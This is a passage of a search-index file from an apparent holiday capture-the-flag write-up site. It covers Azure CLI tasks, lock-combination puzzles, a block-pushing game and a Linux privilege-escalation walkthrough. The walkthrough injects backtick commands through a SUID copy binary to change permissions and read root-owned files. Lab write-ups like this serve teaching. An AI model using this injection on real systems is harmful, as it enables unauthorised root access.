great).</p> <p></p>"},{"location":"objectives/o4/#response","title":"Response","text":"<p>Noel Boetie</p> <p>Great job on completing that challenge! Ever thought about how your newfound skills might come into play later on? Keep that mind sharp, and remember, today's victories are tomorrow's strategies!</p>"},{"location":"objectives/o5/","title":"Azure 101","text":"<p>Difficulty:  Direct link: Linux 101</p>"},{"location":"objectives/o5/#objective","title":"Objective","text":"<p>Request</p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.</p> Sparkle Redberry <p>Hey, Sparkle Redberry here! So, I've been trying to learn about Azure and the Azure CLI and it's driving me nuts. Alabaster Snowball decided to use Azure to host some of his fancy new IT stuff on Geese Islands, and now us elves have to learn it too. Anyway, I know it's important and everyone says it's not as difficult as it seems, but honestly it still feels like quite a challenge for me. Alabaster sent us this Azure CLI reference as well. It's super handy, he said. Honestly, it just confuses me even more. If you can spare a moment, would you mind giving me a hand with this terminal? I'd be really grateful! Pretty please, with holly leaves on top!</p>"},{"location":"objectives/o5/#hints","title":"Hints","text":"Azure CLI Reference <p>The Azure CLI tools come with a builtin help system, but Microsoft also provides this handy cheatsheet.</p> Escape less <p>Use q to quit <code>less</code></p>"},{"location":"objectives/o5/#solution","title":"Solution","text":"<p>You may not know this but the Azure cli help messages are very easy to access. First, try typing: $ az help | less</p> <pre><code>$ az help | less\n</code></pre> <p>Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )</p> <pre><code>$ az account show | less\n{\n  \"environmentName\": \"AzureCloud\",\n  \"id\": \"2b0942f3-9bca-484b-a508-abdae2db5e64\",\n  \"isDefault\": true,\n  \"name\": \"northpole-sub\",\n  \"state\": \"Enabled\",\n  \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n  \"user\": {\n    \"name\": \"northpole@northpole.invalid\",\n    \"type\": \"user\"\n  }\n}\n</code></pre> <p>Excellent! Now get a list of resource groups in Azure. For more information: https://learn.microsoft.com/en-us/cli/azure/group?view=azure-cli-latest</p> <pre><code>$ az group list | less\n[\n  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1\",\n    \"location\": \"eastus\",\n    \"managedBy\": null,\n    \"name\": \"northpole-rg1\",\n    \"properties\": {\n      \"provisioningState\": \"Succeeded\"\n    },\n    \"tags\": {}\n  },\n  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2\",\n    \"location\": \"westus\",\n    \"managedBy\": null,\n    \"name\": \"northpole-rg2\",\n    \"properties\": {\n      \"provisioningState\": \"Succeeded\"\n    },\n    \"tags\": {}\n  }\n]\n</code></pre> <p>Ok, now use one of the resource groups to get a list of function apps. For more information: https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest Note: Some of the information returned from this command relates to other cloud assets used by Santa and his elves. <pre><code>$ az functionapp function list -g northpole-rg1 | less\n[\n  {\n    \"appServicePlanId\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan\",\n    \"availabilityState\": \"Normal\",\n    \"clientAffinityEnabled\": false,\n    \"clientCertEnabled\": false,\n    \"clientCertExclusionPaths\": null,\n    \"clientCertMode\": \"Required\",\n    \"cloningInfo\": null,\n    \"containerSize\": 0,\n    \"customDomainVerificationId\": \"201F74B099FA881DB9368A26C8E8B8BB8B9AF75BF450AF717502AC151F59DBEA\",\n    \"dailyMemoryTimeQuota\": 0,\n    \"defaultHostName\": \"northpole-ssh-certs-fa.azurewebsites.net\",\n    \"enabled\": true,\n    \"enabledHostNames\": [\n      \"northpole-ssh-certs-fa.azurewebsites.net\"\n    ],\n    \"extendedLocation\": null,\n    \"hostNameSslStates\": [\n      {\n        ...\n</code></pre></p> <p>Find a way to list the only VM in one of the resource groups you have access to. For more information: https://learn.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest <pre><code>$ az vm list -g northpole-rg1\nThe client 'f17559a4-d8a2-4661-ba0f-c04f8cf2926d' with object id '8deacb33-214d-4d94-9ab4-d27768410f17' does not have authorization to perform action 'Microsoft.Compute/virtualMachines/read' over scope '/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines' or the scope is invalid. If access was recently granted, please refresh your credentials.\n$ az vm list -g northpole-rg1 | less\n[\n  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1\",\n    \"location\": \"eastus\",\n    \"name\": \"NP-VM1\",\n    \"properties\": {\n      \"hardwareProfile\": {\n        \"vmSize\": \"Standard_D2s_v3\"\n      },\n      \"provisioningState\": \"Succeeded\",\n      \"storageProfile\": {\n        \"imageReference\": {\n          \"offer\": \"UbuntuServer\",\n          \"publisher\": \"Canonical\",\n          \"sku\": \"16.04-LTS\",\n          \"version\": \"latest\"\n        },\n        ...\n</code></pre></p> <p>Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM. For more information: https://learn.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az-vm-run-command-invoke</p> <pre><code>$ az vm run-command invoke -n NP-VM1 --command-id RunShellScript --scripts \"ls\" -g northpole-rg2 | less\n{\n  \"value\": [\n    {\n      \"code\": \"ComponentStatus/StdOut/succeeded\",\n      \"displayStatus\": \"Provisioning succeeded\",\n      \"level\": \"Info\",\n      \"message\": \"bin\\netc\\nhome\\njinglebells\\nlib\\nlib64\\nusr\\n\",\n      \"time\": 1704305551\n    },\n    {\n      \"code\": \"ComponentStatus/StdErr/succeeded\",\n      \"displayStatus\": \"Provisioning succeeded\",\n      \"level\": \"Info\",\n      \"message\": \"\",\n      \"time\": 1704305551\n    }\n  ]\n}\n</code></pre> <p>Response</p> <p>Great, you did it all!</p>"},{"location":"objectives/o5/#response","title":"Response","text":"<p>Sparkle Redberry</p> <p>Wow, you did it! It makes quite a bit more sense to me now. Thank you so much! That Azure Function App URL you came across in the terminal looked interesting. It might be part of that new project Alabaster has been working on with the help of ChatNPT. Let me tell you, since he started using ChatNPT he's been introducing a lot of amazing innovation across the islands. Knowing Alabaster, he'll be delighted to tell you all about it! I think I last saw him on Pixel island. By the way, as part of the Azure documentation he sent the elves, Alabaster also noted that if Azure CLI tools aren't available in an Azure VM we should use the Azure REST API instead. I'm not really sure what that means, but I guess I know what I'll be studying up on next.</p>"},{"location":"objectives/o6/","title":"Luggage Lock","text":"<p>Difficulty:  Direct link: Luggage Lock</p>"},{"location":"objectives/o6/#objective","title":"Objective","text":"<p>Request</p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials</p> Garland Candlesticks <p>Hey there, I'm Garland Candlesticks! I could really use your help with something. You see, I have this important pamphlet in my luggage, but I just can't remember the combination to open it! Chris Elgee gave a talk recently that might help me with this problem. Did you attend that? I seem to recall Chris mentioning a technique to figure out the combinations... I have faith in you! We'll get that luggage open in no time. This pamphlet is crucial for me, so I can't thank you enough for your assistance. Once we retrieve it, I promise to treat you to a frosty snack on me!</p>"},{"location":"objectives/o6/#hints","title":"Hints","text":"Lock Talk <p>Check out Chris Elgee's talk regarding his and his wife's luggage. Sounds weird but interesting!</p>"},{"location":"objectives/o6/#solution","title":"Solution","text":"<p>There doesn't seem to be an easy way to solve this; just hold the lock button slightly down and scroll through the numbers using <code>qwer</code> and <code>asdf</code>. The locks will stick in multiple places, but they'll mostly stick around the <code>8</code>, <code>6</code> <code>0</code> and <code>2</code></p> <p>After entering those numbers, push the lock all the way in to see the bag unlock:</p> <p></p> <p></p>"},{"location":"objectives/o6/#response","title":"Response","text":"<p>Garland Candlesticks</p> <p>Wow, you did it! I knew you could crack the code. Thank you so much!</p>"},{"location":"objectives/o7/","title":"Linux Priv Esc","text":"<p>Difficulty:  Direct link: Linux Priv Esc</p>"},{"location":"objectives/o7/#objective","title":"Objective","text":"<p>Request</p> <p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.</p> Rosemold <p>What am I doing in this saloon? The better question is: what planet are you from? Yes, I\u2019m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here. Whatever. Do you know much about privilege escalation techniques on Linux? You're asking why? How about I'll tell you why after you help me. And you might have to use that big brain of yours to get creative, bub.</p>"},{"location":"objectives/o7/#hints","title":"Hints","text":"Linux Privilege Escalation Techniques <p>There's various ways to escalate privileges on a Linux system. </p> Linux Command Injection <p>Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.</p>"},{"location":"objectives/o7/#solution","title":"Solution","text":"Quote <p>In a digital winter wonderland we play, Where elves and bytes in harmony lay. This festive terminal is clear and bright, Escalate privileges, and bring forth the light.</p> <p>Start in the land of bash, where you reside, But to win this game, to root you must glide. Climb the ladder, permissions to seize, Unravel the mystery, with elegance and ease.</p> <p>There lies a gift, in the root's domain, An executable file to run, the prize you'll obtain. The game is won, the challenge complete, Merry Christmas to all, and to all, a root feat!</p> <ul> <li>Find a method to escalate privileges inside this terminal and then run the binary in /root *</li> </ul> <p>We're not told what the binary we need to run is actually called, so my first step was to see if I could just see it:</p> <pre><code>$ ls /root/\nls: cannot open directory '/root/': Permission denied\n</code></pre> <p>Okay, so my ideal approach to solving this will be:     1. Find a command with the SUID bit set so that it can access /root     2. Use it to access /root to find the name of the command to run     3. Use it to either give me access to the command or run it on my behalf</p>"},{"location":"objectives/o7/#step-1-find-a-command-with-the-suid-bit-set","title":"Step 1: Find a command with the SUID bit set","text":"<p>There's probably a smart way to do this, but the lazy way is to just start at /usr/bin with grep: <pre><code>$ ls -l /usr/bin/ | grep rws\n-rwsr-xr-x 1 root root     85064 Nov 29  2022 chfn\n-rwsr-xr-x 1 root root     53040 Nov 29  2022 chsh\n-rwsr-xr-x 1 root root     88464 Nov 29  2022 gpasswd\n-rwsr-xr-x 1 root root     55528 May 30  2023 mount\n-rwsr-xr-x 1 root root     44784 Nov 29  2022 newgrp\n-rwsr-xr-x 1 root root     68208 Nov 29  2022 passwd\n-rwsr-xr-x 1 root root     16952 Dec  2 22:17 simplecopy\n-rwsr-xr-x 1 root root     67816 May 30  2023 su\n-rwsr-xr-x 1 root root     39144 May 30  2023 umount\n</code></pre></p> <p>Interesting that <code>simplecopy</code> has a later write date and also doesn't sound familiar to me. What can it do?</p> <pre><code>$ simplecopy --help\nUsage: simplecopy &lt;source&gt; &lt;destination&gt;\n</code></pre> <p>Looks like we probably have our winner.</p>"},{"location":"objectives/o7/#step-2-use-the-suid-command-to-find-the-target-command","title":"Step 2: Use the SUID command to find the target command","text":"<pre><code>$ simplecopy /root/* .\nelf@1b594b95da0b:~$ ls -l\ntotal 604\n-rw-r--r-- 1 root root    628 Nov 27 17:07 HELP\n-rwx------ 1 root root 612560 Jan  2 00:45 runmetoanswer\n</code></pre> <p>I, uh, wasn't expecting that to work...</p>"},{"location":"objectives/o7/#step-3-use-the-suid-command-to-run-the-target-command","title":"Step 3: Use the SUID command to run the target command","text":"<p>Does OS command injection work?</p> <pre><code>$ simplecopy \"\\`echo 'hi'\\`\" test\ncp: cannot stat 'hi': No such file or directory\n</code></pre> <p>Seems like it.</p> <p>Escaping</p> <p>You need to escape the backticks, otherwise the shell will evaluate it before passing it to simplecopy.</p> <p>So perhaps we can just make /root/runtoanswer generally executable: <pre><code>$ simplecopy \"\\`chmod 777 /root\\`\" test\ncp: missing destination file operand after 'test'\nTry 'cp --help' for more information.\nelf@1b594b95da0b:~$ simplecopy \"\\`chmod +sx /root/runmetoanswer\\`\" test\ncp: missing destination file operand after 'test'\nTry 'cp --help' for more information.\n</code></pre></p> <p>And then just run the executable: <pre><code>$ /root/runmetoanswer \nWho delivers Christmas presents?\n\n&gt; Santa\nYour answer: Santa\n\nChecking....\nSorry, that answer is incorrect. Please try again!\n</code></pre></p> <p>Hmm, let's see if we can find anything useful in the binary: <pre><code>$ simplecopy \"\\`chmod +rx /root/runmetoanswer\\`\" test\ncp: missing destination file operand after 'test'\nTry 'cp --help' for more information.\n$ strings /root/runmetoanswer\n</code></pre></p> <p>That gives us a lot of output... what about: <pre><code>$ strings -n 7 /root/runmetoanswer | grep -i answer\n</code></pre> Hmm <code>/etc/runtoanswer.yaml</code> seems interesting:</p> <pre><code>$ simplecopy \"\\`cat /etc/runtoanswer.yaml &gt; runtoanswer.yaml\\`\" .\ncp: missing destination file operand after '.'\nTry 'cp --help' for more information.\nelf@1b594b95da0b:~$ ls\nHELP  runmetoanswer  runtoanswer.yaml\nelf@1b594b95da0b:~$ cat runtoanswer.yaml\n</code></pre> <p>So it was just case sensitive...</p> <pre><code>$ /root/runmetoanswer santa\n</code></pre> Info <p>An alternative way to find the answer sheet would've been to try to run runtoanswer without the SUID bit: <pre><code>$ ./runmetoanswer \nSomething went wrong reading the configuration file /etc/runtoanswer.yaml: Couldn't open file: Permission denied (os error 13)\n\nIf this persists, please ask for help!\n</code></pre></p>"},{"location":"objectives/o7/#response","title":"Response","text":"<p>Rosemold</p> <p>Yup, I knew you knew. You just have that vibe. To answer your question of why from earlier... Nunya! But, I will tell you something better, about some information I... found. There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands. The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there. That's all I got. K byyeeeee. Ugh... n00bs...</p>"},{"location":"objectives/o8/","title":"Faster Lock Combination","text":"<p>Difficulty:  Direct link: Faster Lock</p>"},{"location":"objectives/o8/#objective","title":"Objective","text":"<p>Request</p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it!</p> Bow Ninecandle <p>Hey there! I'm Bow Ninecandle, and I've got a bit of a... 'pressing' situation. You see, I need to get into the lavatory, but here's the twist: it's secured with a combination padlock. Talk about bad timing, right? I could really use your help to figure this out before things get... well, urgent. I'm sure there are some clever tricks and tips floating around the web that can help us crack this code without too much of a flush... I mean fuss. Remember, we're aiming for quick and easy solutions here - nothing too complex. Once we've gathered a few possible combinations, let's team up and try them out. I'm crossing my legs - I mean fingers - hoping we can unlock this door soon. After all, everyone knows that the key to holiday happiness is an accessible lavatory! Let's dive into this challenge and hopefully, we won't have to 'hold it' for too long! Ready to help me out?</p>"},{"location":"objectives/o8/#solution","title":"Solution","text":""},{"location":"objectives/o8/#step-1-find-the-sticky-number","title":"Step 1: Find the Sticky Number","text":"<p>Click on the top of the padlock and pull it up slightly to get a little bit of tension. Spin the lock with the arrow keys until it starts to slow down at a specific number:</p> <p></p> <p>Record this as your sticky number. For me, it was 13, but it changes each time.</p>"},{"location":"objectives/o8/#step-2-find-the-guess-numbers","title":"Step 2: Find the Guess Numbers","text":"<p>To find the sticky numbers, move the lock back down to 35. Now, put a lot of tension on the lock so that it barely moves (the status should be dark red). If it gets stuck at half increments around a number, record the middle number. If it gets stuck on full numbers, release some tension and move it up half a number. You should find two numbers it gets stuck on in the 35 - 10 range (widen your search otherwise).</p> <p>My magic numbers were 3 and 8.</p>"},{"location":"objectives/o8/#step-3-calculate-the-first-digit","title":"Step 3: Calculate the first digit","text":"<p>MAGIC_NUMBER + 5. So for me, 17</p>"},{"location":"objectives/o8/#step-4-calculate-the-last-digit","title":"Step 4: Calculate the last digit","text":"<p>We need to figure out:</p> <pre><code>a. FIRST_DIGIT % 4.\nb. magic number, magic number + 10, magic number + 20, magic number + 30\nc. magic number 2 , magic number 2 + 10, magic number 2 + 20, magic number 2 + 30\nd. Which of the results of a and c % 4 == a\n</code></pre> <p>So for me, that's:</p> <pre><code>a. 17 % 4 = 1\n\n   | Magic number  | MN + 10  | MN + 20  | MN + 30  |\nb. | 3             | 13       | 23       | 33       |\nc. | 8             | 18       | 28       | 38       |\n\nd. 13 and 33\n</code></pre> <p>Then put heavy tension on your lock and move it around those two numbers. The looser one is your second number; for me, that's 33.</p>"},{"location":"objectives/o8/#step-5-calculate-the-middle-digit-possibilities","title":"Step 5: Calculate the middle digit possibilities","text":"Initial + 2 + 10 + 18 + 26 + 34 Remainder (1) 3 11 19 27 35 Remainder + 4 (5) 7 15 23 31 39 <p>If your value is over 39</p> <p>Just let it wrap around, ie val % 39</p> <p>Eliminate any values within 2 from your first and third digits. So for me, I can eliminate 19 (too close to 17), 35 (too close to 33), 15 (too close to 17) and 31 (too close to 33).</p>"},{"location":"objectives/o8/#step-6-attempt-all-the-options","title":"Step 6: Attempt all the options","text":"<p>Now just attempt all the possibilities: * 17 3 33 * 17 11 33 * 17 27 33 * 17 7 33 * 17 23 33 * 17 39 33</p> <p>Maybe try twice</p> <p>I was always terrible at opening these sorts of locks; even in high school when I knew the correct combination, it took me a couple of tries \ud83d\ude05</p>"},{"location":"objectives/o8/#response","title":"Response","text":"<p>Bow Ninecandle</p> <p>Oh, thank heavens! You're a lifesaver! With your knack for cracking codes, we've just turned a potential 'loo catastrophe' into a holiday triumph!</p>"},{"location":"objectives/o9/","title":"Game Cartridges: Vol 1","text":"<p>Difficulty:  Direct link: Vol 1</p>"},{"location":"objectives/o9/#objective","title":"Objective","text":"<p>Request</p> <p>Find the first Gamegosling cartridge and beat the game</p> Dusty Giftwrap <p>Arrr, matey, shiver me timbers! There be buried treasure herrrrre. Just kidding, I'm not really a pirate, I was just hoping it would make finding the treasure easier. I guess you heard about the fabled buried treasure, too? I didn't expect to see anyone else here. This uncharted islet was hard to find. There are 3 buried treasures in total, each in its own uncharted area around Geese Islands. I've been searching for hours now with no luck, and these strange toys are starting to give me the creeps. Maybe you'll be able to find it. Here, use my Gameboy Cartridge Detector. Go into your items and test it to make sure it's still working. When you get close to the treasure, it'll start sounding off. The closer you get, the louder the sound. No need to activate or fiddle with it. It just works! I bet one of these creepy toys has the treasure, and I'm sure not going anywhere near them! If you find the treasure, come back and show me, and I'll tell you what I was able to research about it.</p> <p>Good luck!</p>"},{"location":"objectives/o9/#hints","title":"Hints","text":"Buried Treasure <p>There are 3 buried treasures in total, each in its own uncharted area around Geese Islands. Use the gameboy cartridge detector and listen for the sound it makes when treasure is nearby, which gets louder the closer you are. Also look for some kind of distinguishing mark or feature, which could mark the treasure's location.</p> Approximate Proximity <p>Listen for the gameboy cartridge detector's proximity sound that activates when near buried treasure. It may be worth checking around the strange toys in the Tarnished Trove.</p> Gameboy 1 <p>1) Giving things a little push never hurts. 2) Out of sight but not out of ear-shot 3) You think you fixed the QR code? Did you scan it and see where it leads?</p>"},{"location":"objectives/o9/#solution","title":"Solution","text":""},{"location":"objectives/o9/#find-the-game-cartridge","title":"Find the game cartridge","text":"<p>We first hear about the games from Dusty Giftwrap on Tarnished Trove, so we go for an explore around there while listening to music so we can hear the distinctive ching of the detector when we get near.</p> <p>What's that duck doing under this hat?!</p> <p></p>"},{"location":"objectives/o9/#play-the-game","title":"Play the game","text":"<p>We don't actually have to do anything technical to solve this challenge. Simply ignore Elf's grumblings about the game problems and walk through to the dog. He explains how to solve the puzzle; push the piece he points out, then there's a block on the very left side of the grid that needs to be pushed out and all the way around to the right of the grid and the rest are all at the bottom of the grid.</p> order matters <p>The blocks at the bottom of the grid are the only small challenge in this objective. You have to push them in the right order or they'll get stuck. To make things more complicated, when a block is \"singing\", other blocks will disappear if they're in the target spot.</p> <p>Once we've put all of the blocks back in place, we see confirmation that we've fixed the blocks and that it's a QR code:</p> <p> </p> <p>You can upload the image to a QR decoder or scan it with most phone cameras to see that it's a URL</p> <p>Answer</p> <p>santaconfusedgivingplanetsqrcode</p>"},{"location":"objectives/o9/#response","title":"Response","text":"<p>Dusty Giftwrap</p> <p>Whoa, you found it! It's a... video game cartridge? Coooooollll... I mean, arrrrrr.... So, here's what my research uncovered. Not sure what it all means, maybe you can make sense of it. You have all three? I think that makes you ruler of the pirates!</p>"}]}